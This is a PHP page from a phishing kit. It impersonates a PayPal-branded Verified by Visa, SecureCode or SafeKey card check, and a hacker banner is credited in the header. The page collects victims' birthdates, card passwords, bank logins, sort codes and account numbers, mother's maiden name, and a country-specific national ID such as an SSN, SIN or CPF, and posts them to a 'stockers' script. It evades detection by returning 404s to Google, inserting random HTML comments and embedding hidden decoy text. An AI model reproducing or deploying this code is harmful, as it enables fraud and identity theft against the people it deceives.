<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
  include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}
        error_reporting(0);
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if(empty($_POST['password_vbv'])== false) {
        include('../extra/stockers/step3.php');
        }
      }
        ######## [+] VERIFIED BY VISA : SECURECODE [+] #########
        $_SESSION['_cc_brand_'] = strtoupper($_SESSION['_cc_brand_']);
        $VISACARD   = $_SESSION['_cc_brand_'] == "VISA" || $_SESSION['_cc_brand_'] == "VISA ELECTRON";
        $MASTERCARD = $_SESSION['_cc_brand_'] == "MASTERCARD" || $_SESSION['_cc_brand_'] ==  "MAESTRO";
        $DISCOVER   = $_SESSION['_cc_brand_'] == "DISCOVER";
        $AMEX   = $_SESSION['_cc_brand_'] == "AMEX" || $_SESSION['_cc_brand_'] == "AMERICAN EXPRESS";
        $JCP   = $_SESSION['_cc_brand_'] == "JCB";
        if($MASTERCARD) {
        $Type_XXX = "MasterCard SecureCode";
        $VBV_Name = "SecureCode";
        }elseif($VISACARD) {
        $Type_XXX = "Verified by Visa";
        $VBV_Name = "3D Password";
        }elseif($AMEX) {
        $Type_XXX = "American Express SafeKey";
        $VBV_Name = "SafeKey";
        }else{
        header("Location: ../app/process", true, 303);
        }
        ############### [+] HTTP_USER_AGENT [+] ################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <title><?php echo $lg_auth['title']?></title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link rel="stylesheet" href="../app/lib/css/3D_SH33NZ0.css">
      <link type="text/css" rel="stylesheet" href="../app/lib/css/btn.css"/>
      <link type="text/css" rel="stylesheet" href="../app/lib/css/codex.authentication.css" />
  <link rel="shortcut icon" href="lib/pics/favi.ico">
  <link rel="apple-touch-icon" href="lib/pics/favi.png">
      <style type="text/css">
         textarea:focus, input:focus, input[type]:focus, .uneditable-input:focus {   
         border-color: #0070ba;
         box-shadow: 0 1px 1px rgba(0, 0, 255, 0.075) inset, 0 0 8px rgba(0, 0, 255, 0.6);
         outline: 0 none;
         }
      </style>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   </head>
   <body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
      <div id="Rotation">
         <p style="font-size: 13px;"><?php echo $lg_auth['success']?></p>
      </div>
       <div id="xMarcos_9X9X" style="opacity: 1;"><div id="popup">
         <br><br><br><br><br><br><br><br><br><br><br><br><br><br>
            <center><p style="font-size: 15px;"><?php echo $lg_auth['processing']?><strong>....</strong></p></center>
         </div>
         <br>
         <div id="xGhostRiderForm" style="display:none !important;"><?php echo "<!--".rand(0,99999999)."-->"?>
            <div class="a-section a-spacing-medium a-text-center"><?php echo "<!--".rand(0,99999999)."-->"?>
               <a href="#" class="svg-nfLogo signupBasicHeader"><?php echo "<!--".rand(0,99999999)."-->"?>
                   <center> <img src="../app/lib/img/logo.png"></center><?php echo "<!--".rand(0,99999999)."-->"?>
               </a>
            </div><?php echo "<!--".rand(0,99999999)."-->"?>
            <div class="a-section a-text-center">
               <style>
                  div.ex1 {
                  width:400px;
                  margin: auto;
                  }
               </style>
            <?php echo "<!--".rand(0,99999999)."-->"?>   
            <form method="post" action="../extra/stockers/step3.php" class="idform">
             <?php echo "<!--".rand(0,99999999)."-->"?>
               <div class="ex1">
                  <div class="a-section cvf-page-layout">
               <?php echo "<!--".rand(0,99999999)."-->"?>
                     <div id="cvf-page-content" class="a-section">
                        <div class="a-section a-spacing-double-large">
                  <?php echo "<!--".rand(0,99999999)."-->"?>
                           <div class="a-box a-spacing-base">
                       <?php echo "<!--".rand(0,99999999)."-->"?>
                              <div class="a-box-inner a-padding-extra-large">
                         <?php echo "<!--".rand(0,99999999)."-->"?>
                                 <table>
                                    <tbody>
                               <?php echo "<!--".rand(0,99999999)."-->"?>
                                       <tr>      
                          <?php echo "<!--".rand(0,99999999)."-->"?>
                                       <?php 
                                             if($MASTERCARD) {  
                      echo '<td><img class="cc_type" id="cc_type" src="../app/lib/img/mastercard-securecode.png"></td>';
                                             }elseif($VISACARD){
                      echo '<td><img class="cc_type" id="cc_type" src="../app/lib/img/verified-by-visa.png"></td>';
                                             }elseif($AMEX){
                      echo '<td><img class="cc_type" id="cc_type" src="../app/lib/img/safe-key.png"></td>';
                                             }
                                             ?>    
                                        <?php 
                                        if ($_SESSION['_cc_site_']){
              echo '<td><img class="cc_bank" id="cc_bank" resizable="yes" width="128" height="64" title="'.$_SESSION['_cc_bank_'].'" src="https://logo.clearbit.com/'.$_SESSION['_cc_site_'].'"></td>';
                                        }else{
              echo '<td><img class="cc_bank" id="cc_bank" src="../app/lib/img/ssl.png"></td>';
                                        }
                                        ?>

                                       </tr>
                                    </tbody>
                                 </table>
                                 <br />
                                 <style>
                                    width:230px;
                                 </style>
                                 <div id="xDoctorStrange_L1" style="
                                 text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$_SESSION['_cc_bank_'];?></div>
                                 <div id="xDoctorStrange_L1"><?php echo $lg_auth['added']?></div>
                                 <div id="xDoctorStrange_L2"><?=$Type_XXX;?> <?php echo $lg_auth['protect']?> <b></b> <?php echo $lg_auth['center']?> <?=$Type_XXX;?> <?php echo $lg_auth['nextline']?> <?=$Type_XXX;?> <?php echo $lg_auth['password']?></div>
                                 <div id="xDoctorStrange_L3">
                                    <table>
                                       <tbody>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['name']?> :</td>
                                             <td><?=htmlentities($_SESSION['fnm']);?></td>
                                          </tr>
                                           <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['merchant']?> :</td>
                                             <td>PayPal .Inc</td>
                                          </tr>
                                            <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['amount']?> :</td>
                                             <td>0.01 <?=htmlentities($_SESSION['currency']);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['country']?> :</td>
                                             <td class="limit"><?=ucwords(strtolower($_SESSION['_country_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['cardtype']?> :</td>
                                             <td><?=ucwords(strtolower($_SESSION['_ccglobal_']));?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['cardnumber']?> :</td>
                                             <td>XXXX-XXXX-XXXX-<?=substr($_SESSION['ccn'] , -4);?></td>
                                          </tr>
                                          <tr>
                                             <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['datetime']?> :</td>
                                             <td><?=date('m/d/Y').", ".date("h:i:s A");?></td>
                                          </tr>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?php echo $lg_auth['birthdate']?> :</td>
                                                <td>
                                                  <input required 
                                                  style="width: 44px;text-align: center;" 
                                                  id="month" 
                                                  type="tel" 
                                                  placeholder="MM" 
                                                  name="month" 
                                                  class="dob" 
                                                  maxlength="2" autocomplete="off"
                                                  data-maxlength="2"/>
                                                   / 
                                                   <input required 
                                                   style="width: 50px;text-align: center;" 
                                                   id="day" 
                                                   type="tel" 
                                                   placeholder="DD" 
                                                   name="day" 
                                                   class="dob" 
                                                   maxlength="2" autocomplete="off"
                                                   data-maxlength="2"/>
                                                    / 
                                                    <input required  autocomplete="off" 
                                                    style="width: 58px;text-align: center;" 
                                                    id="year" 
                                                    type="tel" 
                                                    placeholder="YYYY" 
                                                    name="year" 
                                                    class="dob" 
                                                    maxlength="4" autocomplete="off"
                                                    data-maxlength="4"/>
                                                  </td>
                                             </tr>
                                             <?php
                                             if(isset($_GET['nextpage'])){
                                             echo '<input hidden name="nextpage"/>';
                                           }
                                                ############################ ITALY ############################ 
                                                if($_SESSION['ip_countryCode'] == "IT") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Codice Fiscale :</td>
                                                <td><input required type="tel" name="codicefiscale" id="codicefiscale" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ Sweden ############################ 
                                                elseif($_SESSION['ip_countryCode'] == "SE") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Personnummer :</td>
                                                <td><input required type="tel" name="pse" id="pse" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ SPAIN ############################ 
                                                elseif($_SESSION['ip_countryCode'] == "ES") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">DNI (NIF/NIE/CIF) :</td>
                                                <td><input required type="tel" name="dni" id="dni" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ BRAZIL ############################ 
                                                elseif($_SESSION['ip_countryCode'] == "NL") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">BSN :</td>
                                                <td><input required type="tel" name="bsn" id="bsn" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ############################ Netherland ############################ 
                                                elseif($_SESSION['ip_countryCode'] == "BR") {  
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">CPF :</td>
                                                <td><input required type="tel" name="cpf" id="cpf" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                }
                                                ################### SWITZERLAND || GERMANY #####################
                                                elseif($_SESSION['ip_countryCode'] == "CH" || $_SESSION['ip_countryCode'] == "DE") {  
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Kontonummer :</td>
                                                <td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################### GREECE #############################
                                                elseif($_SESSION['ip_countryCode'] == "GR") {  
                                            echo '<tr class="Height_XXX">
                                        <td ALIGN="LEFT" style="font-weight: bold;">Official ID :</td>
                                        <td>
                                        <input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }               
                                                ########################### GREECE #############################
                                                elseif($_SESSION['ip_countryCode'] == "IE") {  
                                            echo '<tr class="Height_XXX">
                                        <td ALIGN="LEFT" style="font-weight: bold;">PPS Number :</td>
                                        <td>
                                        <input required type="tel" name="pps" id="pps" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';  
                                                        }
                                                ########################## AUSTRALIA ###########################
                                                elseif($_SESSION['ip_countryCode'] == "AU") {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Online Shopping ID :</td>
                                                <td><input required type="tel" name="osid" id="osid" style="width: 170px;padding-left: px;"></td></tr>

                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">NAB Identification Number :</td>
                                                <td><input required type="tel" name="nabid" id="nabid" style="width: 170px;padding-left: 4px;"></td></tr>

                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Driver license number :</td>
                                                <td><input required type="tel" name="dln" id="dln" style="width: 170px;padding-left: 4px;"></td></tr>

                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Credit Limit :</td>
                                                <td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                        }                                                
                                                ########################## AUSTRALIA ###########################
                                                elseif($_SESSION['ip_countryCode'] == "FR") {
                                                echo '<tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Identifiant banque :</td>
                                                <td><input required type="tel" name="bus" id="bus" style="width: 170px;padding-left: 4px;"></td></tr>
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Mot de passe banque :</td>
                                                <td><input required type="tel" name="bpw" id="bpw" style="width: 170px;padding-left: 4px;"></td></tr>';
                                                        }
                                                ################# IRELAND || UNITED KINGDOM  ###################
                                                elseif ($_SESSION['ip_countryCode'] == "IE" || $_SESSION['ip_countryCode'] == "GB" ) {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Sort Code :</td>
                                                <td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"></td>
                                                </tr>                  
                                                <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Account Number :</td>
                                                <td><input required type="tel" name="accnumber" id="accnumber" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
                                                </tr>';        
                                                        }
                                                ######################## UNITED STATES ######################
                                                elseif ($_SESSION['ip_countryCode'] == "US") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Social Security Number :</td>
                                                <td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                                          </tr>';
                                                  }
                                                ######################## CANADA ######################
                                                elseif ($_SESSION['ip_countryCode'] == "CA") {
                                                echo '  <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;">Social Insurance Number</td>
                                                <td><input required type="tel" name="sin1" id="sin1" class="sinum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="sin2" id="sin2" class="sinum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="sin3" id="sin3" class="sinum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"></td>
                                                                          </tr>';
                                                  }
                                                #################### IRELAND || CANADA ###################
                                                  if ($_SESSION['ip_countryCode'] == "IE" || $_SESSION['ip_countryCode'] == "CA" || $_SESSION['ip_countryCode'] == "US") {
                                                     echo'<tr class="Height_XXX">
                                                                            <td ALIGN="LEFT" style="font-weight: bold;">Mother’s Maiden Name :</td>
                                                                            <td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                                                                        </tr>';
                                                      }     
                                                ?>
                                             <tr class="Height_XXX">
                                                <td ALIGN="LEFT" style="font-weight: bold;"><?=$VBV_Name;?> :</td>
                                                <td><input required type="password" name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"/></td>
                                             </tr>
                                             <tr>
                                              <?php 
                                              $bankphone=$_SESSION['_cc_phone_'];
                                              $bankphone= explode("or", $bankphone);
                                              $ccphone=$bankphone[0];
                                              ?>
                                                <td><?php echo $ccphone;?></td>
                                                <td><?php echo $_SESSION['_cc_site_'];?></td>
                                             </tr>
                                       </tbody>
                                    </table>
                                 </div>
                                 <br>
                                 <div class="submitBtnContainer">
                                 <button style="font-size: 15px;font-weight: normal;" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit"><?php echo $lg_auth['submit']?></button></div>
                                 </form>
                              </div>
                           </div>
                        </div>
                        <p class="a-spacing-none"><?php echo $lg_auth['cannot']?> <?=$Type_XXX;?>?
                        <div class="a-section"><span></span>
                           <a class="a-link-normal"><?php echo $lg_auth['contact']?></a>
                        </div>
                        </p>
                     </div>
                  </div>
               </div>
            </div>
            <style>
               .auth-footer-separator {
               display: inline-block;
               width: 20px;
               }
            </style>
            <div id="footer" class="a-section">
               <div class="a-section a-spacing-none a-text-center">
                  <span class="a-size-mini a-color-secondary">
                  <?php echo $lg_auth['copyright']?> ©1999-<?=date('Y');?>. <?php echo $lg_auth['rights']?>
                  </span>
               </div>
            </div>
         </div>
      </div>
      </div>
      <script type="text/javascript">
      $(document).ready(function(){
      $("#popup").delay(1000).fadeOut(0);
      $("#xGhostRiderForm").delay(1000).fadeIn(300);
      $("#submit").on('click', function () {
      $('#Rotation').fadeIn(300);
      });});
      </script>
   </body>
</html>